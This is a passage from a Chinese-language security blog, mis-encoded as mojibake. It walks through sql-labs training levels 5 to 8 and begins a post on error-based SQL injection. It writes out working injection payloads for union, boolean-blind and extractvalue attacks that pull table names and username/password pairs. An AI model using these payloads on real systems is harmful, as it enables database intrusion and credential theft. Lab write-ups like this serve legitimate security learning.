æŠ¥é”™ï¼Œè¯´æ˜æ•°æ®åº“æŸ¥è¯¢è¯­å¥æŸ¥è¯¢åˆ—æ•°ä¸º3åˆ—</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514000300269.png" alt="image-20230514000300269"></p><p>3.æŸ¥è¾“å‡ºåˆ—çš„ä½ç½®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,3 --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514000817750.png" alt="image-20230514000817750"></p><p>4.æŸ¥çœ‹å½“å‰æ•°æ®åº“å’Œç‰ˆæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,database(),version() --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514001038494.png" alt="image-20230514001038494"></p><p>5.æŸ¥çœ‹å½“å‰æ•°æ®åº“ä¸‹çš„è¡¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514001411510.png" alt="image-20230514001411510"></p><p>6.æŸ¥çœ‹userè¡¨ä¸‹é¢çš„å­—æ®µä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514001554807.png" alt="image-20230514001554807"></p><p>7.æŸ¥çœ‹å­—æ®µæ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,group_concat(username,0x2a,password),3 from users --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514001730590.png" alt="image-20230514001730590"></p><p>å®Œæˆï¼ï¼ï¼ï¼ï¼ï¼</p><h4 id="sql-labsé¶åœºless6"><a href="#sql-labsé¶åœºless6" class="headerlink" title="sql-labsé¶åœºless6"></a>sql-labsé¶åœºless6</h4><p>1.åˆ¤æ–­æ³¨å…¥ç‚¹ï¼ˆåŒå¼•å·æ³¨å…¥ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and 1 --a   é¡µé¢æ˜¾ç¤ºæ­£å¸¸</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514203911904.png" alt="image-20230514203911904"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and 0 -- a   é¡µé¢å¼‚å¸¸ï¼ˆç©ºæ˜¾ç¤ºï¼‰</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514205048775.png" alt="image-20230514205048775"></p><p>2.åˆ¤æ–­å­—ç¬¦é•¿åº¦</p><p>åˆ¤æ–­å½“å‰ä½¿ç”¨çš„æ•°æ®åº“é•¿åº¦æ˜¯å¦å¤§äº1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and length(database())=8 --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514221524192.png" alt="image-20230514221524192"></p><p>3.ç©·ä¸¾å­—ç¬¦</p><p>åˆ¤æ–­å½“å‰ä½¿ç”¨çš„æ•°æ®åº“ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ascllç æ˜¯å¦å¤§äº1ï¼ˆè‚¯å®šå¤§äºï¼‰ï¼Œåœ°å€æ è¾“å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and ascii(substr(database(),1,1)) &gt; 1 -- a</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and left(database(),1)=&#x27;s&#x27; --+</span><br><span class="line"></span><br><span class="line">ç”¨ç©·ä¸¾çš„æ–¹æ³•ä¸€ä¸ªä¸ªåˆ—å‡ºæ¥ï¼Œ....æ•ˆç‡æœ‰ç‚¹æ…¢äº†</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514222128909.png" alt="image-20230514222128909"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and left(database(),8)=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514225957158.png" alt="image-20230514225957158"></p><p>4.åˆ¤æ–­åº“ä¸­æ¯ä¸ªè¡¨åçš„é•¿åº¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) = 6--+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514232750125.png" alt="image-20230514232750125"></p><p>ç¬¬ä¸€ä¸ªè¡¨çš„é•¿åº¦æ˜¯6</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 1,1)) = 8--+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514232933832.png" alt="image-20230514232933832"></p><p>ç¬¬äºŒä¸ªè¡¨çš„é•¿åº¦ä¸º8</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 2,1)) = 7--+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514233146882.png" alt="image-20230514233146882"></p><p>ç¬¬ä¸‰ä¸ªè¡¨çš„é•¿åº¦ä¸º7</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 3,1)) = 5--+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514233314642.png" alt="image-20230514233314642"></p><p>ç¬¬å››ä¸ªè¡¨çš„é•¿åº¦ä¸º5</p><p>5.çˆ†ç ´è¡¨å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) &gt; 100 --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514233558822.png" alt="image-20230514233558822"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514233732069.png" alt="image-20230514233732069"></p><p>æŸ¥çœ‹asciiè¡¨101æ˜¯eï¼Œç¬¬ä¸€ä¸ªè¡¨å¼€å¤´å­—æ¯æ˜¯e</p><p>â€¦..æ­¤å¤„çœç•¥ä¸€äº›æ­¥éª¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),2,1))=115 --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514234142010.png" alt="image-20230514234142010"></p><p>æŸ¥çœ‹asciiè¡¨115æ˜¯uï¼Œç¬¬ä¸€ä¸ªè¡¨å¼€å¤´å­—æ¯æ˜¯u</p><p>â€¦.è¡¨åæ˜¯users</p><h4 id="sql-labsé¶åœºless7"><a href="#sql-labsé¶åœºless7" class="headerlink" title="sql-labsé¶åœºless7"></a>sql-labsé¶åœºless7</h4><p>æ‰“å¼€é¢˜ç›®</p><p>1.åˆ¤æ–­æ˜¯å¦æ˜¯æ•°å­—å‹ä¼ å‚</p><p>2.åˆ¤æ–­æ˜¯å¦æœ‰å•å¼•å·é—­åˆ</p><p>3.åˆ¤æ–­æ˜¯å¦æœ‰åŒå¼•å·é—­åˆ</p><p>4.åˆ¤æ–­æ˜¯å¦å•å¼•å·+æ‹¬å·é—­åˆ</p><p>5.åˆ¤æ–­æ˜¯å¦æ˜¯åŒå¼•å·+æ‹¬å·é—­åˆ</p><p>å¦‚æœä»¥ä¸Šéƒ½ä¸æ˜¯ï¼Œé‚£ä»¥ä¸Šè§„åˆ™éƒ½åŒæ—¶åŠ ä¸Šsleepæµ‹è¯•ä¸€éï¼Œçœ‹æ˜¯ä¸æ˜¯å­˜åœ¨å»¶æ—¶æ³¨å…¥</p><p>å…ˆä¼ å…¥id=1è¯•è¯•å‘¢</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230719210605853.png" alt="image-20230719210605853"></p><p>1.åˆ¤æ–­æ³¨å…¥ç±»å‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;    æŠ¥é”™</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230719210730863.png" alt="image-20230719210730863"></p><p>è¾“å…¥å•å¼•å·ä¹‹åï¼Œé¡µé¢æŠ¥é”™ï¼Œè¯•è¯•åŒå¼•å·</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230719210918196.png" alt="image-20230719210918196"></p><p>select * from users where id=â€™1â€â€˜ä¼šæ­£ç¡®æ‰§è¡Œçš„</p><p>æ‰€ä»¥è¿™é‡Œåˆ¤æ–­å¯èƒ½ä¸ºå•å¼•å·é—­åˆå­—ç¬¦å‹æ³¨å…¥</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230719211628016.png" alt="image-20230719211628016"></p><p>å˜ä¸ºå•å¼•å·ä¹‹åé¡µé¢è¿˜æ˜¯æŠ¥é”™ï¼Œè¯´æ˜é—­åˆä¸ä»…ä»…æ˜¯å•å¼•å·ï¼Œå¯èƒ½è¿˜æœ‰å…¶å®ƒå­—ç¬¦ï¼Œå¯èƒ½ä¸º<code>)</code>    )çš„ä¸ªæ•°ä¹Ÿä¸ç¡®å®š</p><p>å› ä¸ºå½“è¾“å…¥select * from users  where id=(â€˜1â€™)æ—¶å…¶å®æ˜¯å¯ä»¥æ­£ç¡®æ‰§è¡Œçš„</p><p>å…ˆè¯•è¯•ä¸€ä¸ªçš„å§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;) --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230719213838371.png" alt="image-20230719213838371"></p><p>ä¸€ä¸ªï¼‰è¿˜æ˜¯æŠ¥é”™ï¼Œè¯•è¯•ä¸¤ä¸ª</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;))  --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230719214110969.png" alt="image-20230719214110969"></p><p>é¡µé¢æ­£å¸¸æ˜¾ç¤ºäº†ï¼ï¼ï¼è¯´æ˜é—­åˆæ–¹å¼æ˜¯â€™))</p><p>å¯ä»¥è¿›è¡Œæ­£å¸¸çš„æ³¨å…¥å…¶ä»–è¯­å¥ã€‚</p><p>2.å…ˆåˆ¤æ–­å­—æ®µæ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) order by 3 --+   æ­£å¸¸</span><br><span class="line">?id=1&#x27;)) order by 4 --+   é”™è¯¯</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230719214818187.png" alt="image-20230719214818187"></p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230719214945753.png" alt="image-20230719214945753"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) and length(database())  --+</span><br></pre></td></tr></table></figure><p>outfileå‰æœŸæ¡ä»¶ï¼š</p><p>åœ¨MySQLé‡Œé¢ä½¿ç”¨select â€¦ into outfileå¯ä»¥æŠŠæ•°æ®å¯¼å‡ºåˆ°æ–‡æœ¬æ–‡ä»¶ä¸Š<br>é‡Œé¢æœ‰å‡ ä¸ªå‚æ•°<br>secure_file_priv ç”¨æ¥é™åˆ¶å¯¼å‡ºæ•ˆæœã€‚ä»–æœ‰ä¸‰ä¸ªå±æ€§ï¼š<br>nullé™åˆ¶ä¸èƒ½å¯¼å‡º<br>ä¸ºç©ºå¯ä»¥è‡ªå®šä¹‰<br>ä¸ºä¸€ä¸ªè·¯å¾„åˆ™åªèƒ½å¯¼å‡ºåˆ°æŒ‡å®šè·¯å¾„</p><p>å…·ä½“è®¾ç½®åœ¨phpstudyä¸­çš„é…ç½®æ–‡ä»¶mysql.iniä¸­åœ¨æœ€åä¸€è¡ŒåŠ å…¥ secure_file_privå³å¯c</p><h4 id="sql-labsé¶åœºless8"><a href="#sql-labsé¶åœºless8" class="headerlink" title="sql-labsé¶åœºless8"></a>sql-labsé¶åœºless8</h4><p>boolç›²æ³¨å¸¸ç”¨çš„å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">database()   æ˜¾ç¤ºæ•°æ®åº“åç§°</span><br><span class="line">left(a,b)    ä»å·¦ä¾§æˆªå–açš„å‰bä½</span><br><span class="line">substr(a,b,c) ä»bä½ç½®å¼€å§‹ï¼Œæˆªå–å­—ç¬¦ä¸²aåˆ°cçš„é•¿åº¦</span><br><span class="line">mid(a,b,c)  ä»bä½ç½®å¼€å§‹ï¼Œæˆªå–aå­—ç¬¦ä¸²çš„cä½</span><br><span class="line">length()    è¿”å›å­—ç¬¦ä¸²é•¿åº¦</span><br><span class="line">ascii()      å°†æŸä¸ªå­—ç¬¦è½¬æ¢æˆasciiå€¼</span><br><span class="line">char()       å°†asciiç è½¬æ¢ä¸ºå¯¹åº”çš„å­—ç¬¦</span><br></pre></td></tr></table></figure><p>æ‰“å¼€æºç çœ‹äº†ä¸€ä¸‹</p><p>è¿™é“é¢˜å¯ä»¥ä½¿ç”¨æ—¶é—´ç›²æ³¨ï¼Œä¸èƒ½ä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼Œå› ä¸ºæŠ¥é”™çš„ä¿¡æ¯è¢«æ³¨é‡Šæ‰äº†</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230515103641066.png" alt="image-20230515103641066"></p><p>1.åˆ¤æ–­æ³¨å…¥ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1   é¡µé¢æ­£å¸¸ï¼Œä½†æ˜¯æ²¡æœ‰æ˜¾ç¤ºæ¶ˆæ¯</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230515105031032.png" alt="image-20230515105031032"></p><p>åŠ å•å¼•å·</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230515105151868.png" alt="image-20230515105151868"></p><p>é¡µé¢æ— å›æ˜¾ï¼Œåº”è¯¥æ˜¯æŠ¥é”™äº†</p><p>ç»§ç»­è¯•è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=1</span><br><span class="line">?id=1 and 1=2 é¡µé¢éƒ½æ­£å¸¸ï¼Œè¯´æ˜ä¸æ˜¯æ•°å­—å‹æ³¨å…¥ï¼Œ</span><br><span class="line">?id=1&#x27; and 1=1 --+  é¡µé¢æ­£å¸¸ï¼Œå¯ä»¥æ­£å¸¸çš„æ˜¾ç¤º</span><br><span class="line">    çœŸ      çœŸ    çœŸ</span><br><span class="line">?id=1&#x27; and 1=2 --+</span><br><span class="line">   çœŸ       å‡    å‡</span><br><span class="line">é¡µé¢å‘ç”Ÿå˜åŒ–(æ²¡æœ‰æŠ¥é”™ï¼Œåªæ˜¯æŸ¥ä¸å‡ºæ¥æ•°æ®ï¼Œå’Œä¸Šé¢çš„æ— å›æ˜¾ä¸ä¸€æ ·)ï¼Œè¯´æ˜æ˜¯å•å¼•å·é—­åˆçš„å­—ç¬¦å‹æ³¨å…¥ã€‚</span><br></pre></td></tr></table></figure><p>1.æŸ¥çœ‹æ•°æ®åº“ç‰ˆæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and left(version(),1)=5 %23</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230515112258415.png" alt="image-20230515112258415"></p><p>è¿™ä¸ªæ•°æ®åº“çš„ç‰ˆæœ¬ä¸º5.7.42 ï¼Œä¸Šé¢çš„è¯­å¥æ˜¯çœ‹ç‰ˆæœ¬å·çš„ç¬¬ä¸€ä½æ˜¯ä¸æ˜¯5ï¼Œå¦‚æœå›æ˜¾æ­£å¸¸ï¼Œé‚£ä¹ˆè¯´æ˜ç¬¬ä¸€ä½å°±æ˜¯5</p><p>ä¸Šå›¾æ˜¾ç¤ºæ­£å¸¸ï¼Œå‰©ä¸‹çš„æ…¢æ…¢æµ‹ï¼Œä¸€èˆ¬ä½¿ç”¨è„šæœ¬ã€‚</p><p>2.çŒœè§£æ•°æ®åº“çš„é•¿åº¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and length(database(),1)&gt;&#x27;a&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230515114347238.png" alt="image-20230515114347238"></p><p>æ•°æ®åº“é•¿åº¦ä¸º 8 æ—¶ï¼Œé¡µé¢å›æ˜¾æ­£å¸¸ã€‚è¿™é‡Œè¯´æ˜ä¸‹ï¼Œé•¿åº¦è¦ä¸€ä¸ªä¸€ä¸ªçš„è¯•ï¼Œè¿™é‡Œåªæ˜¯éªŒè¯ä¸‹ï¼Œåœ¨è¦çˆ†ä¿¡æ¯ä¸å¤šçš„æƒ…å†µä¸‹å¯ä»¥æ‰‹åŠ¨è¯•è¯•ï¼ˆäºŒåˆ†æ³•å¯ä»¥æé«˜å¾ˆå¤šæ•ˆç‡ï¼‰ï¼Œå¤ªå¤šçš„è¯å°±å»ºè®®ç”¨è„šæœ¬ï¼Œæˆ–è€…ç”¨burp çˆ†ç ´ã€‚</p><p>3.çŒœæ•°æ®åº“åå­—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and left(databse(),1)&gt;&#x27;a&#x27; --+</span><br></pre></td></tr></table></figure><p><code>left(a,b)</code>ï¼šè¿”å›aå­—ç¬¦ä¸²ä»å·¦è‡³bä½æ•°ï¼Œè¯¦ç»†çœ‹ä¸‹é¢ç”¨æ³•</p><p>4.çŒœè¡¨å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and left((select table_name from information_schema.tables where table_schema=database() limit x,1),y)=&quot;&quot;--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>5.çŒœå­—æ®µå</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and left((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; limit x,1),y)=&quot;&quot;--+</span><br></pre></td></tr></table></figure><p>6.çŒœæ•°æ®</p><p>ç”¨æˆ·å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and left((select username from users limit x,1),y)=&quot;&quot;--+</span><br></pre></td></tr></table></figure><p>é€šè¿‡å˜æ¢xï¼Œyçš„å€¼å¯ä»¥å¾—åˆ°æ‰€æœ‰çš„ç”¨æˆ·å ã€‚</p><p>å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and left((select password from users limit x,1),y)=&quot;&quot;--+</span><br></pre></td></tr></table></figure><p>é€šè¿‡å˜æ¢ xï¼Œy çš„å€¼å¯ä»¥å¾—åˆ°æ‰€æœ‰çš„å¯†ç  ã€‚</p><p>é€šè¿‡å¸ƒå°”ç›²æ³¨æ‰‹å·¥æ³¨å…¥æ¯”è¾ƒç¹çï¼Œå¯ä»¥ç”¨è„šæœ¬ã€‚</p><p>ä¸‹é¢åˆ†äº«è„šæœ¬</p><h4 id="sql-labsé¶åœºless9"><a href="#sql-labsé¶åœºless9" class="headerlink" title="sql-labsé¶åœºless9"></a>sql-labsé¶åœºless9</h4><h4 id="sql-labsé¶åœºless10"><a href="#sql-labsé¶åœºless10" class="headerlink" title="sql-labsé¶åœºless10"></a>sql-labsé¶åœºless10</h4><h4 id="sql-labsé¶åœºless11"><a href="#sql-labsé¶åœºless11" class="headerlink" title="sql-labsé¶åœºless11"></a>sql-labsé¶åœºless11</h4><h4 id="sql-labsé¶åœºless12"><a href="#sql-labsé¶åœºless12" class="headerlink" title="sql-labsé¶åœºless12"></a>sql-labsé¶åœºless12</h4><h4 id="sql-labsé¶åœºless13"><a href="#sql-labsé¶åœºless13" class="headerlink" title="sql-labsé¶åœºless13"></a>sql-labsé¶åœºless13</h4><h4 id="sql-labsé¶åœºless14"><a href="#sql-labsé¶åœºless14" class="headerlink" title="sql-labsé¶åœºless14"></a>sql-labsé¶åœºless14</h4><h4 id="sql-labsé¶åœºless15"><a href="#sql-labsé¶åœºless15" class="headerlink" title="sql-labsé¶åœºless15"></a>sql-labsé¶åœºless15</h4><h4 id="sql-labsé¶åœºless16"><a href="#sql-labsé¶åœºless16" class="headerlink" title="sql-labsé¶åœºless16"></a>sql-labsé¶åœºless16</h4><h4 id="sql-labsé¶åœºless17"><a href="#sql-labsé¶åœºless17" class="headerlink" title="sql-labsé¶åœºless17"></a>sql-labsé¶åœºless17</h4><h4 id="sql-labsé¶åœºless18"><a href="#sql-labsé¶åœºless18" class="headerlink" title="sql-labsé¶åœºless18"></a>sql-labsé¶åœºless18</h4><h4 id="sql-labsé¶åœºless19"><a href="#sql-labsé¶åœºless19" class="headerlink" title="sql-labsé¶åœºless19"></a>sql-labsé¶åœºless19</h4><h4 id="sql-labsé¶åœºless20"><a href="#sql-labsé¶åœºless20" class="headerlink" title="sql-labsé¶åœºless20"></a>sql-labsé¶åœºless20</h4><h4 id="sql-labsé¶åœºless21"><a href="#sql-labsé¶åœºless21" class="headerlink" title="sql-labsé¶åœºless21"></a>sql-labsé¶åœºless21</h4><h4 id="sql-labsé¶åœºless22"><a href="#sql-labsé¶åœºless22" class="headerlink" title="sql-labsé¶åœºless22"></a>sql-labsé¶åœºless22</h4><h4 id="sql-labsé¶åœºless23"><a href="#sql-labsé¶åœºless23" class="headerlink" title="sql-labsé¶åœºless23"></a>sql-labsé¶åœºless23</h4><h4 id="sql-labsé¶åœºless24"><a href="#sql-labsé¶åœºless24" class="headerlink" title="sql-labsé¶åœºless24"></a>sql-labsé¶åœºless24</h4><h4 id="sql-labsé¶åœºless25"><a href="#sql-labsé¶åœºless25" class="headerlink" title="sql-labsé¶åœºless25"></a>sql-labsé¶åœºless25</h4>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´é¶åœºå­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æŠ¥é”™æ³¨å…¥</title>
      <link href="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="æŠ¥é”™æ³¨å…¥çš„å®šä¹‰"><a href="#æŠ¥é”™æ³¨å…¥çš„å®šä¹‰" class="headerlink" title="æŠ¥é”™æ³¨å…¥çš„å®šä¹‰"></a>æŠ¥é”™æ³¨å…¥çš„å®šä¹‰</h2><p>å½“ç½‘ç«™çš„é¡µé¢ä¸Šæ²¡æœ‰æ˜¾ç¤ºä½ç”¨äºå±•ç¤ºSQLè¯­å¥æ‰§è¡Œåçš„ç»“æœï¼Œä½†æ˜¯SQLè¯­å¥æ‰§è¡Œå¯ä»¥è¾“å‡ºé”™è¯¯ä¿¡æ¯ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ³¨å…¥è¿‡ç¨‹ä¸­è¿”å›çš„é”™è¯¯ä¿¡æ¯è¿›è¡Œåˆ¤æ–­ã€‚</p><p>æŠ¥é”™æ³¨å…¥å°±æ˜¯åˆ©ç”¨äº†æ•°æ®åº“çš„æŸäº›æœºåˆ¶ï¼Œäººä¸ºåœ°åˆ¶é€ é”™è¯¯æ¡ä»¶ï¼Œä½¿å¾—æŸ¥è¯¢ç»“æœèƒ½å¤Ÿå‡ºç°åœ¨é”™è¯¯ä¿¡æ¯ä¸­ã€‚</p><h2 id="å¸¸è§çš„å‡½æ•°"><a href="#å¸¸è§çš„å‡½æ•°" class="headerlink" title="å¸¸è§çš„å‡½æ•°"></a>å¸¸è§çš„å‡½æ•°</h2><p>1.extractvalue()</p><p>2.updataxml()</p><p>3.count() + rand() +floor() +group  by() å¯¼è‡´çš„ä¸»é”®é‡å¤</p><h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><p>extractvalue (xml_document,xpath_string)</p><p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯xmlæ–‡æ¡£å¯¹è±¡åç§°</p><p>ç¬¬äºŒä¸ªå‚æ•°ä½œç”¨æ˜¯ä»xmlæ–‡æ¡£å¯¹è±¡ä¸­è¿”å›æŸ¥è¯¢åˆ°çš„å­—ç¬¦ä¸²å€¼ï¼Œè¿”å›ç»“æœé•¿åº¦é™åˆ¶åœ¨32ä½å­—ç¬¦ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(null,concat(0x7e,(sqli_inject),0x7e))</span><br><span class="line"></span><br><span class="line">æ³¨ï¼šåˆ©ç”¨extractvalue()å¯¹æ•°æ®è¿›è¡Œä¸€ä¸ªæ’åºï¼ŒæŒ‡å®šä¸€ä¸ªå‚æ•°ä¸ºnullï¼Œå¯ä»¥æ¢æˆ1ã€#æˆ–è€…å…¶ä»–ç¬¦å·ï¼Œä½¿å…¶æŠ¥é”™ï¼Œå¹¶æ‰§è¡Œç¬¬äºŒä¸ªå‚æ•°è¯­å¥ã€‚0x7eè¡¨ç¤º&quot;-&quot;å·ã€‚</span><br></pre></td></tr></table></figure><h2 id="UpdateXmlå‡½æ•°"><a href="#UpdateXmlå‡½æ•°" class="headerlink" title="UpdateXmlå‡½æ•°"></a>UpdateXmlå‡½æ•°</h2><p>å‡½æ•°ç”¨æ³•ï¼š</p><p>UPDATEXML(XML_document,XPath_string,new_value)</p><p>ä¸‰ä¸ªå­—ç¬¦ä¸²å‚æ•°ï¼š</p><p>1  .XML_Documentæ˜¯Stringæ 